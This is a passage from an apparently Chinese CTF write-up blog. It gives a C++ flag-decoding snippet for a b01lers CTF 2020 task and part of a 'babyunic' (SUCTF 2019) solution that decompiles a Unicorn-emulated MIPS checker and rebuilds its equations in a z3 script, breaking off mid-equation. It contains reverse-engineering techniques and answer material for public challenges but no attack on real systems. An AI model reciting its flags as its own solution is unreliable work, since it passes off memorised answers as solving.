&lt;iostream&gt;#include \"ida.h\"using namespace std;int main() { unsigned __int64 a5; signed __int64 v8; // rdx unsigned __int64 v11; // rcx a5 = 0LL; v8 = 0xFFFFFF91LL; ll v8s[75]; v8s[0] = 0x91; ll target[] = {0xE1, 0xF2, 0xE6, 0xF2, 0xEC, 0xEF, 0xC8, 0x95, 0xF2, 0xD8, 0x8E, 0xAC, 0xE0, 0xAD, 0x82, 0xA5, 0x79, 0x6E, 0x18, 0x09, 0x3D, 0x3B, 0x4A, 0xE1, 0xC1, 0x8F, 0xB9, 0xC2, 0x52, 0x5E, 0x72, 0x51, 0xDC, 0x92, 0xAA, 0x90, 0x39, 0x40, 0x27, 0x4A, 0xC4, 0x97, 0xC0, 0x72, 0x18, 0x42, 0x96, 0xF7, 0xC5, 0x71, 0x3D, 0xE4, 0x90, 0xA7, 0x5A, 0x0C, 0xA8, 0x8C, 0x6F, 0x74, 0xF1, 0xCA, 0xA4, 0x0A, 0x17, 0x8A, 0xA5, 0x54, 0xEE, 0x9B, 0x3B, 0x69, 0xA3, 0xEF, 0x54}; while (a5 &lt; 75) { v11 = (unsigned __int8) v8 + a5++; v8 = (unsigned int) v11 + (unsigned int) ((unsigned __int64) (0x8080808080808081LL * (unsigned __int128) v11 &gt;&gt; 64) &gt;&gt; 7); v8s[a5] = v8; } string flag; for (int i = 0; i &lt; 75; i++) { char tmp = target[i] ^v8s[i]; flag += tmp; } cout &lt;&lt; flag &lt;&lt; endl; return 0;} 输出的flag为 1pctf{th3_m0d3rn_st34m_3ng1n3_w45_1nv3nt3d_1n_1698_buT_th3_b3st_0n3_in_1940}","link":"/2020/03/16/b01lersCTF-2020-wp/"},{"title":"babyunic-攻防世界","text":"这是第一次接触unicorn的题目，也算是第一次用z3来解决题目，花了好长时间去熟悉z3和unicorn，确实很强大 打开来有个脚本 1LD_PRELOAD=./un.so.1 ./babyunic func 逐个调用，看一下babyunic 12345678910111213141516171819202122232425262728undefined8 FUN_00100eb9(int param_1,long param_2){ int iVar1; void *__s1; void *pvVar2; if (param_1 == 2) { puts(\"SUCTF 2019\"); printf(\"input your flag:\"); __s1 = malloc(0x200); pvVar2 = malloc(0x200); __isoc99_scanf(&amp;DAT_00101033,pvVar2); FUN_00100cba(pvVar2,__s1,*(undefined8 *)(param_2 + 8),__s1); iVar1 = memcmp(__s1,DWORD_ARRAY_00302020,0xa8); if (iVar1 == 0) { puts(\"congratuation!\"); } else { puts(\"fail!\"); } } else { puts(\"no input files\"); } return 0;} 输入一个字符串经过处理后和已知字符串进行对比，相同则通过，接下来看看处理的方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void FUN_00100cba(char *param_1,undefined8 param_2,char *param_3){ long lVar1; void *__ptr; size_t sVar1; long in_FS_OFFSET; undefined4 local_38; undefined4 local_34; int local_30; undefined4 local_2c; undefined8 local_28; FILE *local_20; void *local_18; long local_10; lVar1 = *(long *)(in_FS_OFFSET + 0x28); local_20 = fopen(param_3,\"rb\"); __ptr = malloc(0x7100); fread(__ptr,1,0x7100,local_20); local_38 = 0x101fffc0; local_34 = 0x101fffc0; local_30 = 0x101ffb00; local_2c = 0x101ffa00; /* mips32大端序 */ uc_open(3,0x40000004,&amp;local_28); uc_mem_map(local_28,0x400000,0x200000,7); uc_mem_map(local_28,0x10000000,0x200000,7); sVar1 = strlen(param_1); uc_mem_write(local_28,(long)local_30,param_1,sVar1); uc_mem_write(local_28,0x400000,__ptr,0x7100); uc_reg_write(local_28,0x1f,&amp;local_38); uc_reg_write(local_28,0x20,&amp;local_34); uc_reg_write(local_28,7,&amp;local_2c); uc_reg_write(local_28,6,&amp;local_30); uc_emu_start(local_28,0x400000,0x40706c,0,0); uc_mem_read(local_28,0x101ffa00,param_2,200); uc_close(local_28); fclose(local_20); if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return;} 这里用到了unicorn来模拟其它架构的处理器，查阅unicorn引用的头文件可以得到以下信息 12345678910111213local_20 = fopen(param_3,\"rb\");__ptr = malloc(0x7100);fread(__ptr,1,0x7100,local_20);//读取输入的文件funcuc_open(3,0x40000004,&amp;local_28);//第一个参数3代表mips架构，第二个参数代表mips32+大端序，第三个参数是句柄sVar1 = strlen(param_1);uc_mem_write(local_28,(long)local_30,param_1,sVar1);//param_1对应我们输入的字符串，放入local_30指向的地址，应该是栈uc_mem_write(local_28,0x400000,__ptr,0x7100);//func为可执行文件，0x400000凭经验是代码段uc_mem_read(local_28,0x101ffa00,param_2,200);//从栈上的某个地址读取200个字节到param_2里 最后这个函数的输出是param_2也就是最终用来比较的__s1，所以接下来需要搞清楚func函数里进行了哪些操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void UndefinedFunction_00000000(byte *param_1,int *param_2){ int iStack16; int iStack12; iStack12 = 0; while (param_1[iStack12] != 0) { iStack12 = iStack12 + 1; } iStack16 = 0; while (iStack16 &lt; iStack12) { param_1[iStack16] = (param_1[iStack16] &lt;&lt; 3 | param_1[iStack16] &gt;&gt; 5) ^ (byte)iStack16; iStack16 = iStack16 + 1; } *param_2 = ((((((((((((((((((((((((((((((((uint)*param_1 + (uint)param_1[1] + (uint)param_1[2]) - (uint)param_1[3]) + (uint)param_1[4]) - (uint)param_1[5]) - (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8]) + (uint)param_1[9] + (uint)param_1[10]) - (uint)param_1[0xb]) + (uint)param_1[0xc]) - (uint)param_1[0xd]) - (uint)param_1[0xe]) + (uint)param_1[0xf]) - (uint)param_1[0x10]) - (uint)param_1[0x11]) + (uint)param_1[0x12] + (uint)param_1[0x13]) - (uint)param_1[0x14]) + (uint)param_1[0x15] + (uint)param_1[0x16] + (uint)param_1[0x17] + (uint)param_1[0x18]) - (uint)param_1[0x19]) + (uint)param_1[0x1a]) - (uint)param_1[0x1b]) + (uint)param_1[0x1c] + (uint)param_1[0x1d]) - (uint)param_1[0x1e]) - (uint)param_1[0x1f]) + (uint)param_1[0x20]) - (uint)param_1[0x21]) + (uint)param_1[0x22] + (uint)param_1[0x23]) - (uint)param_1[0x24]) - (uint)param_1[0x25]) + (uint)param_1[0x26]) - (uint)param_1[0x27]) + (uint)param_1[0x28] + (uint)param_1[0x29]; param_2[1] = (((((((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) + (uint)param_1[2]) - (uint)param_1[3]) - (uint)param_1[4]) + (uint)param_1[5]) - (uint)param_1[6]) - (uint)param_1[7]) - (uint)param_1[8]) - (uint)param_1[9]) + (uint)param_1[10]) - (uint)param_1[0xb]) + (uint)param_1[0xc]) - (uint)param_1[0xd] ) - (uint)param_1[0xe]) + (uint)param_1[0xf]) - (uint)param_1[0x10]) - (uint)param_1[0x11]) + (uint)param_1[0x12]) - (uint)param_1[0x13]) + (uint)param_1[0x14] + (uint)param_1[0x15]) - (uint)param_1[0x16]) - (uint)param_1[0x17]) - (uint)param_1[0x18]) + (uint)param_1[0x19]) - (uint)param_1[0x1a]) + (uint)param_1[0x1b]) - (uint)param_1[0x1c]) - (uint)param_1[0x1d]) + (uint)param_1[0x1e] + (uint)param_1[0x1f] + (uint)param_1[0x20] + (uint)param_1[0x21] + (uint)param_1[0x22] + (uint)param_1[0x23]) - (uint)param_1[0x24]) - (uint)param_1[0x25]) - (uint)param_1[0x26]) - (uint)param_1[0x27]) - (uint)param_1[0x28]) + (uint)param_1[0x29]; param_2[2] = ((((((((((((((((((((((((((((((uint)*param_1 - (uint)param_1[1]) + (uint)param_1[2] + ……………… 实在是太长了，就不放全了，可以看得出来param_1是我们的输入，经过一个处理之后用一系列复杂的方程计算出了param_2 这个时候就要用z3一把梭解决问题了 首先对最终用于比较的字符进行一些处理 12345678910from z3 import *import ctypese = [0xFFFFFF94, 0xFFFFFF38, 0x00000126, 0xFFFFFF28, 0xFFFFFC10, 0x00000294, 0xFFFFFC9E, 0x000006EA, 0x000000DC, 0x00000006, 0xFFFFFF0C, 0xFFFFFDF6, 0xFFFFFA82, 0xFFFFFCD0, 0x00000182, 0x000003DE, 0x0000014E, 0x000002B2, 0xFFFFF8D8, 0x00000174, 0xFFFFFAA6, 0xFFFFF9D4, 0x000001C2, 0xFFFFF97C, 0x0000035A, 0x00000146, 0xFFFFFF3C, 0xFFFFFA14, 0x000001CE, 0x000007DC, 0xFFFFFD48, 0x00000098, 0x0000085E, 0xFFFFFDB0, 0xFFFFFFBC, 0x0000036E, 0xFFFFFF4E, 0xFFFFF836, 0x000005C0, 0x000006AE, 0x00000694, 0x00000022]en = map(lambda x: ctypes.c_int32(x).value, e)enc = [z3.IntVal(i) for i in en] 在babyunic里是小端序存储，但是在unicorn里模拟的是32位大端序，需要进行一个转换，先是转换成大端序，然后转换成c的int32类型 1234567c = [Int('c%d' % i) for i in range(42)]flag = []solver = Solver()for v in c: solver.add(v &gt;= 0x0) solver.add(v &lt;= 0xff) 设定好符号，添加约束为ascii码值，然后添加方程的约束 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269solver.add(enc[0] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[ 8]) + c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) + c[0x15] + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23]) - c[ 0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[1] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[ 8]) - c[9]) + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) - c[0x11]) + c[0x12]) - c[0x13]) + c[0x14] + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[ 0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[0x21] + c[0x22] + c[ 0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[2] == (((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5]) - c[6]) - c[7]) + c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[ 0x19] + c[0x1a]) - c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28]) - c[ 0x29])solver.add(enc[3] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[ 8]) - c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[ 0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[4] == (((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[ 8] + c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10] + c[0x11]) - c[0x12]) + c[0x13]) - c[ 0x14]) + c[0x15]) - c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[5] == ((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7] + c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[ 0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[ 0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[ 0x1f] + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[ 0x27]) + c[0x28] + c[0x29])solver.add(enc[6] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[ 9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) - c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[ 0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[7] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[8] + c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[ 0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[0x16]) - c[ 0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[0x1b] + c[0x1c] + c[0x1d] + c[0x1e] + c[ 0x1f] + c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) + c[0x24] + c[0x25] + c[0x26] + c[ 0x27]) - c[0x28]) - c[0x29])solver.add(enc[8] == (((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[8] + c[ 9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12]) - c[0x13]) + c[0x14] + c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[0x1b]) + c[ 0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[ 0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[9] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) - c[8]) - c[ 9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) + c[ 0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[ 0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[10] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[ 8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[ 0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) - c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0xb] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) + c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[ 0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xc] == (((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4]) - c[5]) - c[6]) + c[ 7] + c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12]) - c[ 0x13]) - c[0x14]) - c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[ 0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[ 0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27]) - c[ 0x28]) - c[0x29])solver.add(enc[0xd] == (((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) + c[6]) - c[7]) + c[8]) - c[9]) + c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d]) - c[ 0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[0x23]) + c[0x24]) - c[ 0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[0xe] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) + c[6]) - c[7]) + c[8] + c[ 9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c]) - c[ 0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22] + c[0x23] + c[0x24] + c[ 0x25] + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xf] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4] + c[5]) - c[6]) + c[7]) - c[8]) - c[ 9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) - c[ 0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[ 0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x10] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[8] + c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[ 0x10]) - c[0x11]) + c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) - c[ 0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c] + c[ 0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23]) - c[ 0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x11] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[ 8]) - c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[ 0x22]) + c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x12] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5]) - c[6]) + c[7]) - c[8]) + c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[ 0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[0x14]) - c[ 0x15]) - c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x13] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) + c[6]) - c[7]) - c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[ 0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20] + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[ 0x28]) - c[0x29])solver.add(enc[0x14] == ((((((((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) + c[ 7]) - c[8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[ 0x13]) + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[ 0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[0x15] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6] + c[7]) - c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[ 0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[ 0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x16] == (((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7]) - c[8]) + c[ 9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[0x13]) - c[0x14]) + c[0x15] + c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) - c[ 0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[ 0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x17] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) + c[8]) - c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) + c[ 0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) - c[ 0x15]) + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[ 0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x18] == (((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) + c[ 9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) + c[0x13] + c[0x14] + c[0x15] + c[0x16] + c[0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[ 0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x19] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[ 8] + c[9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[ 0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) - c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[ 0x22]) - c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x1a] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7]) - c[8]) - c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[ 0x10]) - c[0x11]) + c[0x12]) - c[0x13]) - c[0x14]) + c[0x15] + c[0x16] + c[ 0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) + c[ 0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1b] == (((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[ 8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[ 0x14]) - c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[ 0x1b]) + c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[ 0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x1c] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[ 8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[ 0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1d] == ((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) + c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[0x13]) + c[0x14] + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) + c[0x19] + c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[ 0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26] + c[0x27]) - c[0x28]) + c[ 